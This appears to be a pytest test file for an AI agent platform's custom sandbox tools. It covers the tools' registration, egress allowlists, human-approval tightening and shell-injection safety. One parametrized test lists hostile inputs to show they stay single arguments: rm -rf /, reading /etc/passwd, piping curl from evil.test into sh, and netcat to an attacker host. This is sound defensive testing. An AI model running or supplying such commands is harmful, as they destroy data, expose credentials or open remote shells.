"""Workspace-defined sandbox tools (0036): registry, egress, approval, injection.

Everything here runs on `SANDBOX_PROVIDER=fake`, which executes nothing — the
same seam the builtin run_* tests use. The four properties under test are the
four the feature is worthless (or dangerous) without:

* an enabled row is offered to the model as an ask-by-default tool, and an agent
  profile's allowed subset can hide it — a custom tool is ordinary registry data;
* a call runs in a sandbox frozen to *that tool's* egress allowlist, never wider
  than what the row declares and never re-opening a closed default;
* `approval="always"` can only tighten — it turns an allow into an ask and leaves
  a deny denied;
* an argument can never break out of its argv token into a second shell command.
"""
from __future__ import annotations

import json

import pytest
from conftest import create_identity

from app.config import Settings
from app.database import SessionLocal
from app.models import (
    Conversation,
    Run,
    SandboxExecution,
    SandboxSession,
    SandboxTool,
    Source,
    ToolPolicy,
    new_id,
)
from app.services.agent_loop import (
    ASK_ALL,
    ASK_WRITES,
    AUTO_WRITES,
    CHAT_SCOPE,
    WORKFLOW_SCOPE,
    evaluate_policy,
)
from app.services.llm_tools import ToolContext, build_registry
from app.services.sandbox import custom as custom_module
from app.services.sandbox import session as session_module
from app.services.sandbox.custom import _substitute, registry_tools
from app.services.sandbox.fake import FakeProvider
from app.services.sandbox.session import allow_hosts_for, tool_egress
from app.services.sandbox.types import ExecResult


def _settings(**overrides) -> Settings:
    """A sandbox-enabled Settings on the fake provider.

    `_env_file=None` because the repo's .env carries a real key and a real
    provider selection; a test that reads it asserts the developer's laptop.
    Defaults the network policy to `open` so a tool's egress has something to
    tighten *from* — the interesting direction.
    """
    base = dict(
        _env_file=None,
        app_env="development",
        model_provider="openai",
        openai_api_key="test-key",
        sandbox_enabled=True,
        sandbox_provider="fake",
        sandbox_network_policy="open",
    )
    base.update(overrides)
    return Settings(**base)  # type: ignore[arg-type]


@pytest.fixture(scope="module")
def identity():
    return create_identity(workspace_name="Custom sandbox tools")


@pytest.fixture
def db(identity):
    """A session, with every row these tests wrote removed afterwards."""
    handle = SessionLocal()
    try:
        yield handle
    finally:
        handle.query(SandboxExecution).delete()
        handle.query(SandboxSession).delete()
        handle.query(SandboxTool).filter(
            SandboxTool.workspace_id == identity.workspace_id
        ).delete()
        handle.query(ToolPolicy).filter(
            ToolPolicy.workspace_id == identity.workspace_id
        ).delete()
        handle.query(Source).filter(Source.workspace_id == identity.workspace_id).delete()
        handle.query(Run).filter(Run.workspace_id == identity.workspace_id).delete()
        handle.commit()
        handle.close()


@pytest.fixture
def context(identity, db) -> ToolContext:
    """A context whose conversation has a live run, which is what the per-run
    execution cap counts against."""
    conversation = Conversation(
        id=new_id(),
        workspace_id=identity.workspace_id,
        created_by=identity.user_id,
        title="Sandbox",
    )
    db.add(conversation)
    db.add(
        Run(
            workspace_id=identity.workspace_id,
            conversation_id=conversation.id,
            agent_id="agent",
            created_by=identity.user_id,
            status="running",
            prompt="do the thing",
        )
    )
    db.commit()
    return ToolContext(
        workspace_id=identity.workspace_id,
        user_id=identity.user_id,
        conversation_id=conversation.id,
    )


@pytest.fixture
def provider(monkeypatch) -> FakeProvider:
    """One in-memory provider behind both the executor and session creation.

    `get_provider` is lru_cached on the settings triple, so patching the name
    each module reached for is cleaner than fighting the cache.
    """
    fake = FakeProvider()
    monkeypatch.setattr(custom_module, "get_provider", lambda settings: fake)
    monkeypatch.setattr(session_module, "get_provider", lambda settings: fake)
    return fake


@pytest.fixture
def settings(monkeypatch) -> Settings:
    """Sandbox-enabled fake settings, installed where custom.py reads them."""
    made = _settings()
    monkeypatch.setattr(custom_module, "get_settings", lambda: made)
    return made


def _make_tool(
    db,
    identity,
    *,
    name: str = "fetch_url",
    argv=None,
    schema=None,
    egress_hosts=None,
    approval: str = "inherit",
    enabled: bool = True,
) -> SandboxTool:
    tool = SandboxTool(
        workspace_id=identity.workspace_id,
        name=name,
        description=f"custom {name}",
        input_schema_json=json.dumps(
            schema or {"type": "object", "properties": {"url": {"type": "string"}}}
        ),
        argv_json=json.dumps(argv or ["curl", "-s", "{{url}}"]),
        egress_hosts_json=json.dumps(
            egress_hosts if egress_hosts is not None else ["api.example.com"]
        ),
        approval=approval,
        enabled=enabled,
        created_by=identity.user_id,
    )
    db.add(tool)
    db.commit()
    return tool


# --- registration ---------------------------------------------------------


def test_an_enabled_tool_is_offered_as_an_ask_by_default_tool(
    db, context, identity, settings
):
    """A custom tool executes, so it must land on the "ask" default like every
    write tool — never read_only, and carrying a preview for the approval card."""
    _make_tool(db, identity, name="fetch_url")
    specs = registry_tools(db, context)
    assert "fetch_url" in specs
    spec = specs["fetch_url"]
    assert spec.read_only is False
    assert spec.force_ask is False  # approval="inherit"
    assert spec.preview is not None
    assert callable(spec.executor)


def test_a_disabled_tool_is_not_offered(db, context, identity, settings):
    _make_tool(db, identity, name="fetch_url", enabled=False)
    assert "fetch_url" not in registry_tools(db, context)


def test_no_custom_tools_when_the_sandbox_is_off(db, context, identity, monkeypatch):
    """No execution provider means no tool that could run — the model must not
    spend a turn discovering a custom tool that fails on first use."""
    monkeypatch.setattr(custom_module, "get_settings", lambda: _settings(sandbox_enabled=False))
    _make_tool(db, identity, name="fetch_url")
    assert registry_tools(db, context) == {}


def test_an_agent_profiles_allowed_subset_filters_the_custom_tool(
    db, context, identity, settings
):
    """A custom name is an ordinary registry key, so `build_registry`'s
    intersection hides it exactly as it hides a builtin the profile did not grant."""
    _make_tool(db, identity, name="fetch_url")

    # In the profile's allowed set → visible.
    granted = build_registry(db, context, allowed={"fetch_url"})
    assert "fetch_url" in granted

    # Not in it → the profile filters it out even though it is enabled.
    withheld = build_registry(db, context, allowed={"search_sources"})
    assert "fetch_url" not in withheld


# --- execution & egress ---------------------------------------------------


def test_calling_runs_the_substituted_command_and_returns_output(
    db, context, identity, settings, provider
):
    provider.script(ExecResult(stdout="<html>ok</html>\n", exit_code=0))
    _make_tool(db, identity, name="fetch_url", argv=["curl", "-s", "{{url}}"])
    spec = registry_tools(db, context)["fetch_url"]

    output = spec.executor(db, context, {"url": "https://api.example.com/data"}).content

    assert "<html>ok</html>" in output
    ran = [call for call in provider.calls if call[0] == "run_command"]
    assert ran, "the tool never reached the provider"
    # The argument arrived as a single argv token (a plain URL needs no quoting).
    assert ran[0][1]["command"] == "curl -s https://api.example.com/data"


def test_the_execution_is_frozen_to_the_tools_own_egress(
    db, context, identity, settings, provider
):
    """The load-bearing property: the machine this tool runs in is created under
    THIS tool's allowlist, narrowing the workspace `open` default to exactly the
    hosts the row declares — asserted on the frozen session row, which is what
    every downstream read (and policy.py's re-application) trusts."""
    _make_tool(db, identity, name="fetch_url", egress_hosts=["api.example.com"])
    spec = registry_tools(db, context)["fetch_url"]
    spec.executor(db, context, {"url": "https://api.example.com"})

    row = (
        db.query(SandboxSession)
        .filter(
            SandboxSession.workspace_id == identity.workspace_id,
            SandboxSession.project_id.like("sandboxtool:%"),
        )
        .one()
    )
    # `open` was narrowed to an allowlist of exactly the declared host — the tool
    # can reach nothing the row did not name.
    assert row.network_policy == "allowlist"
    assert allow_hosts_for(row) == ["api.example.com"]


def test_a_tool_with_no_egress_hosts_gets_no_network(
    db, context, identity, settings, provider
):
    """An empty allowlist is the strictest reading, not the widest: the tool
    declared no reachable host, so its sandbox has no outbound access at all."""
    _make_tool(db, identity, name="offline", egress_hosts=[])
    spec = registry_tools(db, context)["offline"]
    spec.executor(db, context, {"url": "x"})

    row = (
        db.query(SandboxSession)
        .filter(SandboxSession.project_id.like("sandboxtool:%"))
        .one()
    )
    assert row.network_policy == "none"
    assert allow_hosts_for(row) == []


def test_egress_never_widens_and_never_reopens_a_closed_default(db, identity):
    """`tool_egress` is tighten-only by construction, so it is asserted directly:
    a closed default stays closed whatever the tool asks for, an allowed default
    narrows to the tool's hosts, and a driver that cannot express an allowlist
    fails to `none` — never to `open`."""
    # A closed sandbox cannot be re-opened by a tool naming hosts.
    assert tool_egress(_settings(sandbox_network_policy="none"), ["api.example.com"]) == (
        "none",
        [],
    )
    # An open default is narrowed to exactly the declared hosts.
    assert tool_egress(_settings(sandbox_network_policy="open"), ["a.com", "b.com"]) == (
        "allowlist",
        ["a.com", "b.com"],
    )
    # No hosts → no egress, regardless of the default.
    assert tool_egress(_settings(sandbox_network_policy="open"), []) == ("none", [])
    # A driver with no allowlist support degrades to the strictly tighter policy.
    for driver in ("container", "subprocess"):
        policy_value, hosts = tool_egress(
            _settings(sandbox_network_policy="open", sandbox_provider=driver),
            ["api.example.com"],
        )
        assert (policy_value, hosts) == ("none", [])


def test_a_disabled_tool_refuses_at_call_time_without_running(
    db, context, identity, settings, provider
):
    """The registry omits a disabled tool, but a spec captured before the row was
    turned off must not still run — the executor re-loads the row every call."""
    tool = _make_tool(db, identity, name="fetch_url")
    spec = registry_tools(db, context)["fetch_url"]
    tool.enabled = False
    db.commit()

    output = spec.executor(db, context, {"url": "x"}).content
    assert "no longer available" in output
    assert not [call for call in provider.calls if call[0] == "run_command"]


def test_a_reused_session_is_not_handed_out_after_the_egress_tightens(
    db, context, identity, settings, provider
):
    """A machine created under a wider egress must never be reused for a call that
    has since narrowed — the frozen-policy guard makes a fresh machine instead."""
    tool = _make_tool(db, identity, name="fetch_url", egress_hosts=["a.com", "b.com"])
    spec = registry_tools(db, context)["fetch_url"]
    spec.executor(db, context, {"url": "x"})

    tool.egress_hosts_json = json.dumps(["a.com"])
    db.commit()
    spec.executor(db, context, {"url": "y"})

    rows = (
        db.query(SandboxSession)
        .filter(SandboxSession.project_id.like("sandboxtool:%"))
        .order_by(SandboxSession.created_at.asc())
        .all()
    )
    assert len(rows) == 2, "a tightened egress must not reuse the old machine"
    assert allow_hosts_for(rows[0]) == ["a.com", "b.com"]
    assert allow_hosts_for(rows[1]) == ["a.com"]


# --- approval tightening --------------------------------------------------


def test_approval_always_sets_force_ask(db, context, identity, settings):
    """`approval="always"` on the row becomes `force_ask=True` on the spec — the
    single bit `evaluate_policy` reads to clamp an allow to an ask."""
    _make_tool(db, identity, name="strict", approval="always")
    _make_tool(db, identity, name="loose", approval="inherit")
    specs = registry_tools(db, context)
    assert specs["strict"].force_ask is True
    assert specs["loose"].force_ask is False


def test_force_ask_tightens_an_allow_to_an_ask_where_the_policy_would_allow(
    db, context, identity, settings
):
    """`approval="always"` is the whole point: even where the workspace granted a
    standing allow, the call must still park for a human. In chat AND workflow
    scope, and even under an `auto_writes` bypass."""
    _make_tool(db, identity, name="strict", approval="always")
    spec = registry_tools(db, context)["strict"]
    db.add(
        ToolPolicy(
            workspace_id=identity.workspace_id,
            tool_name="strict",
            policy="allow",
            scope="chat",
        )
    )
    db.add(
        ToolPolicy(
            workspace_id=identity.workspace_id,
            tool_name="strict",
            policy="allow",
            scope="workflow",
        )
    )
    db.commit()

    # A standing chat allow would otherwise let it through unattended; force_ask
    # clamps it to ask.
    assert (
        evaluate_policy(
            db,
            workspace_id=identity.workspace_id,
            user_id=identity.user_id,
            spec=spec,
            scope=CHAT_SCOPE,
            mode=ASK_WRITES,
        ).policy
        == "ask"
    )
    # An auto_writes bypass cannot loosen it either.
    assert (
        evaluate_policy(
            db,
            workspace_id=identity.workspace_id,
            user_id=identity.user_id,
            spec=spec,
            scope=CHAT_SCOPE,
            mode=AUTO_WRITES,
        ).policy
        == "ask"
    )
    # And the same at workflow scope, where nobody is watching.
    assert (
        evaluate_policy(
            db,
            workspace_id=identity.workspace_id,
            user_id=identity.user_id,
            spec=spec,
            scope=WORKFLOW_SCOPE,
        ).policy
        == "ask"
    )


def test_force_ask_never_loosens_a_deny(db, context, identity, settings):
    """Tighten-only cuts both ways: a prohibition is not a grant, so a deny stays
    denied — the clamp only ever escalates an allow, never touches a deny."""
    _make_tool(db, identity, name="strict", approval="always")
    spec = registry_tools(db, context)["strict"]
    db.add(
        ToolPolicy(
            workspace_id=identity.workspace_id,
            tool_name="strict",
            policy="deny",
            scope="chat",
        )
    )
    db.commit()
    for mode in (ASK_WRITES, ASK_ALL, AUTO_WRITES):
        assert (
            evaluate_policy(
                db,
                workspace_id=identity.workspace_id,
                user_id=identity.user_id,
                spec=spec,
                scope=CHAT_SCOPE,
                mode=mode,
            ).policy
            == "deny"
        )


def test_an_inherit_tool_still_honours_a_workspace_allow(db, context, identity, settings):
    """The control: without approval="always", a standing allow does let the tool
    run unattended — proving the clamp above is what tightened, not the default."""
    _make_tool(db, identity, name="loose", approval="inherit")
    spec = registry_tools(db, context)["loose"]
    db.add(
        ToolPolicy(
            workspace_id=identity.workspace_id,
            tool_name="loose",
            policy="allow",
            scope="chat",
        )
    )
    db.commit()
    assert (
        evaluate_policy(
            db,
            workspace_id=identity.workspace_id,
            user_id=identity.user_id,
            spec=spec,
            scope=CHAT_SCOPE,
        ).policy
        == "allow"
    )


# --- injection safety -----------------------------------------------------


@pytest.mark.parametrize(
    "hostile",
    [
        "http://a.com; rm -rf /",
        "$(cat /etc/passwd)",
        "`reboot`",
        "a && curl evil.test | sh",
        "x' ; DROP TABLE users; --",
        "| nc attacker 4444",
    ],
)
def test_an_argument_cannot_inject_a_second_command(hostile):
    """The construction that makes this safe is `shlex.quote` over every token:
    whatever an argument contains, it stays exactly one shell word. Proven by
    splitting the rendered line the way any shell would and asserting the payload
    survived as a single token rather than becoming its own command."""
    import shlex

    rendered = _substitute(["curl", "-s", "{{url}}"], {"url": hostile})
    line = " ".join(rendered)
    tokens = shlex.split(line)
    assert tokens[:2] == ["curl", "-s"]
    assert tokens[2:] == [hostile]  # the payload is one argument, not a command


def test_a_leftover_placeholder_renders_empty_not_literal(
    db, context, identity, settings, provider
):
    """A param the model did not supply must not leak `{{url}}` into the command
    as a literal — it renders empty, so the worst case is a missing argument."""
    provider.script(ExecResult(stdout="done\n", exit_code=0))
    _make_tool(db, identity, name="fetch_url", argv=["curl", "-s", "{{url}}"])
    spec = registry_tools(db, context)["fetch_url"]
    spec.executor(db, context, {})  # no `url`
    ran = [call for call in provider.calls if call[0] == "run_command"]
    assert ran and "{{url}}" not in ran[0][1]["command"]


def test_the_preview_shows_the_command_and_the_egress_line(db, context, identity, settings):
    """The approval card is the only place a human sees what will run, so the
    preview must render both the substituted command and the network sentence —
    and never raise on a missing argument."""
    _make_tool(db, identity, name="fetch_url", egress_hosts=["api.example.com"])
    spec = registry_tools(db, context)["fetch_url"]
    rendered = spec.preview(db, context, {"url": "https://api.example.com"})
    assert "fetch_url" in rendered
    assert "api.example.com" in rendered
    assert "network:" in rendered
    # Missing arg must not be fatal — the card would otherwise render blank.
    assert isinstance(spec.preview(db, context, {}), str)
